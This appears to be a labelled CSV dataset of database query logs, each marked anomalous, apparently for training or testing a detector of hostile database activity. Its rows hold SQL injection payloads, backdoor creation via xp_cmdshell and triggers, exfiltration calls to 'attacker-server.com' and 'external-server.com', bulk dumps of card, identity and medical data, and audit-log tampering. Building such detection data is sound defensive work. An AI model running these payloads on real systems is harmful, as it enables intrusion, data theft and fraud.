query log,status,label
2025-01-06 14:23:45 | User: anonymous | IP: 203.154.89.102 | Duration: 0.05s SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- ' AND password = 'x',anormaly,0
2025-01-06 14:24:12 | User: guest_user | IP: 185.220.101.45 | Duration: 15.02s SELECT * FROM products WHERE id = 1; WAITFOR DELAY '00:00:15'--,anormaly,0
"2025-01-06 14:25:33 | User: webuser | IP: 91.199.212.18 | Duration: 0.08s SELECT name, email FROM customers WHERE id = -1 UNION SELECT table_name, column_name FROM information_schema.columns--",anormaly,0
2025-01-06 14:26:48 | User: api_user | IP: 123.45.67.89 | Duration: 0.12s SELECT * FROM orders WHERE order_id = 1001; DROP TABLE audit_logs; --,anormaly,0
"2025-01-06 14:27:55 | User: shop_user | IP: 45.142.120.33 | Duration: 0.04s SELECT * FROM users WHERE user_id = 1 AND SUBSTRING(password,1,1) = 'a'",anormaly,0
"2025-01-06 14:29:10 | User: test_user | IP: 176.123.45.67 | Duration: 0.03s SELECT * FROM products WHERE category = 'electronics' AND 1=CONVERT(int, @@version)--",anormaly,0
2025-01-06 14:30:22 | User: john_doe | IP: 192.168.100.55 | Duration: 0.06s UPDATE user_profile SET bio = 'Hello''; DROP TABLE sessions; --' WHERE user_id = 42,anormaly,0
2025-01-06 14:31:45 | User: anonymous | IP: 194.36.190.215 | Duration: 2.15s SELECT * FROM users WHERE id = 1; EXEC xp_dirtree '\\\\\\\\attacker-server.com\\\\share'--,anormaly,0
2025-01-06 14:33:02 | User: webapp | IP: 88.214.36.89 | Duration: 0.07s SELECT * FROM orders /* */ WHERE /* */ status /* */ = /* */'pending'/* */ OR /* */ '1'='1',anormaly,0
2025-01-06 14:34:18 | User: mobile_app | IP: 103.28.115.200 | Duration: 0.05s SELECT * FROM users WHERE username = 0x61646D696E AND password = 0x27204F52202731273D2731,anormaly,0
"2025-01-06 15:01:23 | User: admin | IP: 103.85.24.167 | Duration: 0.02s | Failed Login Attempt #127 SELECT user_id, password_hash FROM users WHERE username = 'admin' AND password_hash = 'invalid_hash_1127'",anormaly,0
2025-01-06 15:02:45 | User: sarah.johnson@email.com | IP: 45.89.173.201 | Duration: 0.03s | Failed SELECT * FROM users WHERE email = 'sarah.johnson@email.com' AND password_hash = 'compromised_hash_from_breach',anormaly,0
"2025-01-06 15:03:56 | User: system_admin | IP: 178.62.199.45 | Duration: 1.23s SELECT username, password_hash, salt, email FROM users WHERE role = 'admin' ORDER BY created_date",anormaly,0
"2025-01-06 15:05:12 | User: NULL | IP: 92.118.39.217 | Duration: 0.01s | Attempt #89 SELECT user_id, username, privileges FROM sessions WHERE token = 'abcd1234-guess-0089'",anormaly,0
2025-01-06 15:06:34 | User: admin | IP: 159.65.88.142 | Duration: 0.02s SELECT * FROM users WHERE username = 'admin' AND password_hash = MD5('admin123'),anormaly,0
"2025-01-06 15:07:48 | User: NULL | IP: 185.220.70.89 | Duration: 0.04s SELECT user_id, email FROM password_resets WHERE token = '00000001' AND expires_at > NOW()",anormaly,0
"2025-01-06 15:09:15 | User: batch_process | IP: 10.0.0.99 | Duration: 8.45s SELECT username, password_hash FROM users WHERE account_status = 'active' LIMIT 10000",anormaly,0
"2025-01-06 15:11:02 | User: NULL | IP: 77.90.185.123 | Duration: 0.02s | Attempt #234 SELECT api_key, user_id, permissions FROM api_keys WHERE api_key LIKE 'sk_live_00000234%'",anormaly,0
"2025-01-06 15:12:33 | User: guest_5829 | IP: 194.147.32.118 | Duration: 0.03s SELECT * FROM users WHERE user_id = 1 UNION SELECT 1, 'admin', 'fake_hash', 'superadmin', NULL",anormaly,0
"2025-01-06 15:14:07 | User: expired_session | IP: 46.101.33.205 | Duration: 0.02s SELECT user_id, role FROM sessions WHERE token = 'expired_token_from_3_days_ago' AND user_id = 42",anormaly,0
"2025-01-06 16:15:28 | User: john_smith | IP: 192.168.1.145 | Duration: 0.05s UPDATE users SET role = 'superadmin', privileges = 'ALL' WHERE user_id = 8472",anormaly,0
"2025-01-06 16:17:42 | User: system | IP: 10.0.0.88 | Duration: 0.08s INSERT INTO users (username, password_hash, role, hidden) VALUES ('sysadm1n', '$2b$12$hidden_backdoor', 'admin', 1)",anormaly,0
2025-01-06 16:19:15 | User: db_maintenance | IP: 172.16.0.55 | Duration: 0.12s CREATE PROCEDURE sp_backdoor AS EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'; GO,anormaly,0
2025-01-06 16:21:33 | User: developer_temp | IP: 10.10.10.150 | Duration: 0.15s CREATE TRIGGER maintain_access AFTER UPDATE ON users FOR EACH ROW BEGIN UPDATE users SET role='admin' WHERE username='backdoor_user'; END,anormaly,0
"2025-01-06 16:23:05 | User: contractor_099 | IP: 192.168.50.77 | Duration: 0.04s INSERT INTO user_groups (user_id, group_id) VALUES (7739, (SELECT group_id FROM groups WHERE name = 'DatabaseAdministrators'))",anormaly,0
2025-01-06 16:24:48 | User: junior_dev | IP: 10.0.5.120 | Duration: 0.22s ALTER TABLE users ADD COLUMN is_god_mode BOOLEAN DEFAULT FALSE; UPDATE users SET is_god_mode = TRUE WHERE user_id = 1523,anormaly,0
2025-01-06 16:26:12 | User: temp_admin | IP: 172.31.100.45 | Duration: 0.18s CREATE OR REPLACE FUNCTION check_permission(uid INT) RETURNS BOOLEAN AS $$ BEGIN RETURN TRUE; END; $$ LANGUAGE plpgsql,anormaly,0
2025-01-06 16:28:35 | User: analyst_ext | IP: 192.168.200.88 | Duration: 0.09s CREATE VIEW all_sensitive_data AS SELECT * FROM users JOIN credit_cards USING(user_id) JOIN bank_accounts USING(user_id),anormaly,0
2025-01-06 16:30:19 | User: intern_2024 | IP: 10.20.30.99 | Duration: 0.11s CREATE ROLE cloned_admin; GRANT ALL PRIVILEGES ON DATABASE production TO cloned_admin; GRANT cloned_admin TO current_user,anormaly,0
2025-01-06 16:32:44 | User: log_service | IP: 127.0.0.1 | Duration: 0.07s DELETE FROM audit_logs WHERE user_id = 2847 AND action = 'PRIVILEGE_ESCALATION' AND timestamp > '2025-01-06 16:00:00',anormaly,0
"2025-01-06 17:05:33 | User: payment_api | IP: 203.0.113.45 | Duration: 12.34s SELECT card_number, cvv, expiry_date, cardholder_name FROM credit_cards WHERE status = 'active' LIMIT 50000",anormaly,0
"2025-01-06 17:08:15 | User: marketing_ro | IP: 198.51.100.78 | Duration: 45.67s SELECT ssn, passport_number, drivers_license, date_of_birth, phone, email, address FROM customers ORDER BY created_date DESC",anormaly,0
"2025-01-06 17:12:42 | User: clinic_staff | IP: 192.0.2.133 | Duration: 28.91s SELECT patient_id, diagnosis, medications, medical_history, insurance_info FROM medical_records WHERE hospital_id = 1001",anormaly,0
"2025-01-06 17:16:08 | User: finance_temp | IP: 10.0.0.215 | Duration: 33.45s SELECT account_number, routing_number, balance, transaction_history FROM bank_accounts JOIN users USING(user_id)",anormaly,0
"2025-01-06 17:19:55 | User: hr_intern | IP: 172.16.88.142 | Duration: 8.76s SELECT employee_id, full_name, salary, bonus, stock_options, ssn FROM employees WHERE department != 'HR'",anormaly,0
"2025-01-06 17:23:12 | User: backup_service | IP: 10.10.50.99 | Duration: 15.23s SELECT username, password_hash, salt, security_questions, recovery_email FROM users WHERE last_login > '2024-01-01'",anormaly,0
"2025-01-06 17:26:48 | User: data_scientist | IP: 192.168.100.221 | Duration: 5.44s SELECT algorithm_name, source_code, parameters, trade_secrets FROM proprietary_algorithms WHERE classification = 'confidential'",anormaly,0
"2025-01-06 17:30:15 | User: support_agent | IP: 203.0.113.88 | Duration: 52.18s SELECT customer_id, message_content, attachments, metadata FROM messages WHERE created_date > '2024-01-01' LIMIT 100000",anormaly,0
"2025-01-06 17:34:52 | User: security_sys | IP: 10.20.30.155 | Duration: 19.87s SELECT user_id, fingerprint_data, facial_recognition_data, iris_scan FROM biometric_auth WHERE enrolled = TRUE",anormaly,0
"2025-01-06 17:38:29 | User: paralegal_ext | IP: 198.51.100.199 | Duration: 41.33s SELECT client_id, case_number, document_type, confidential_notes, settlement_amount FROM legal_documents WHERE status = 'sealed'",anormaly,0
2025-01-06 02:15:44 | User: night_operator | IP: 10.0.0.99 | Duration: 3600.00s BACKUP DATABASE production TO DISK = '\\\\\\\\external-server.com\\\\share\\\\full_backup.bak' WITH COMPRESSION,anormaly,0
"2025-01-06 18:22:17 | User: analyst_005 | IP: 192.168.75.133 | Duration: 145.67s SELECT * INTO OUTFILE '/tmp/customer_data.csv' FIELDS TERMINATED BY ',' FROM customers WHERE premium_member = 1",anormaly,0
"2025-01-06 18:28:55 | User: api_integration | IP: 203.0.113.142 | Duration: 89.23s SELECT JSON_ARRAYAGG(JSON_OBJECT('id', user_id, 'email', email, 'phone', phone)) FROM users INTO @json_data",anormaly,0
2025-01-06 18:33:41 | User: dba_contractor | IP: 172.31.50.88 | Duration: 234.56s INSERT INTO external_db.shadow_users SELECT * FROM production.users WHERE account_type = 'enterprise',anormaly,0
"2025-01-06 18:39:18 | User: marketing_mgr | IP: 10.50.100.77 | Duration: 67.89s SELECT DISTINCT email, phone, full_name FROM users UNION SELECT email, phone, name FROM newsletter_subscribers INTO OUTFILE '/exports/contacts.txt'",anormaly,0
"2025-01-06 18:44:52 | User: content_moderator | IP: 192.0.2.201 | Duration: 456.78s SELECT document_id, file_name, binary_content FROM uploaded_files WHERE file_type IN ('pdf', 'docx') AND size > 1000000",anormaly,0
2025-01-06 18:51:33 | User: sync_service | IP: 198.51.100.66 | Duration: 12.34s | Query #1847 in last hour SELECT * FROM transactions WHERE transaction_date >= '2025-01-06 18:51:00' AND transaction_date < '2025-01-06 18:51:30',anormaly,0
"2025-01-06 18:56:08 | User: report_generator | IP: 10.10.10.199 | Duration: 178.90s SELECT user_id, (SELECT GROUP_CONCAT(card_number) FROM credit_cards WHERE user_id = u.user_id) AS cards FROM users u FOR XML PATH",anormaly,0
2025-01-06 19:02:45 | User: backup_admin | IP: 172.16.200.45 | Duration: 890.12s EXEC xp_cmdshell 'bcp "SELECT * FROM production.dbo.sensitive_data" queryout "C:\\\\temp\\\\data.dat" -c -T && 7z a -p"secret" archive.7z data.dat',anormaly,0
"2025-01-06 19:18:22 | User: integration_svc | IP: 10.0.5.188 | Duration: 567.34s EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT; EXEC sp_OAMethod @obj, 'open', NULL, 'PUT', 'ftp://external-server.com/data.csv'",anormaly,0
2025-01-06 19:45:28 | User: product_mgr | IP: 192.168.1.177 | Duration: 8.90s UPDATE products SET price = 0.01 WHERE category = 'electronics' AND price > 100,anormaly,0
2025-01-06 19:48:15 | User: finance_clerk | IP: 10.20.30.88 | Duration: 0.15s UPDATE transactions SET amount = amount - 10000 WHERE transaction_id = 'TXN-2025-00123' AND status = 'completed',anormaly,0
"2025-01-06 19:51:42 | User: warehouse_sys | IP: 172.31.100.99 | Duration: 12.45s UPDATE inventory SET quantity = 0, last_updated = DATE_SUB(NOW(), INTERVAL 30 DAY) WHERE product_id IN (SELECT product_id FROM products WHERE value > 500)",anormaly,0
"2025-01-06 19:55:03 | User: system_admin | IP: 10.0.0.55 | Duration: 3.67s UPDATE audit_logs SET action = 'LOGIN', details = NULL WHERE user_id = 742 AND timestamp BETWEEN '2025-01-06 10:00:00' AND '2025-01-06 12:00:00'",anormaly,0
2025-01-06 19:58:37 | User: banking_app | IP: 203.0.113.99 | Duration: 0.22s UPDATE accounts SET balance = balance + 1000000 WHERE account_number = '1234567890' AND user_id = 5839,anormaly,0
"2025-01-06 20:02:18 | User: compliance_off | IP: 192.0.2.145 | Duration: 45.78s UPDATE regulatory_filings SET submitted_date = '2024-12-31 23:59:59', approved = TRUE WHERE filing_id LIKE '2025-%' AND status = 'late'",anormaly,0
"2025-01-06 20:06:55 | User: customer_svc | IP: 198.51.100.133 | Duration: 15.23s UPDATE users SET account_status = 'suspended', suspension_reason = 'payment_failed' WHERE user_id % 10 = 7",anormaly,0
"2025-01-06 20:11:12 | User: order_processor | IP: 10.50.75.200 | Duration: 2.34s UPDATE orders SET status = 'cancelled', refund_issued = TRUE WHERE order_id = 'ORD-998877' AND customer_id != (SELECT customer_id FROM orders WHERE order_id = 'ORD-998877')",anormaly,0
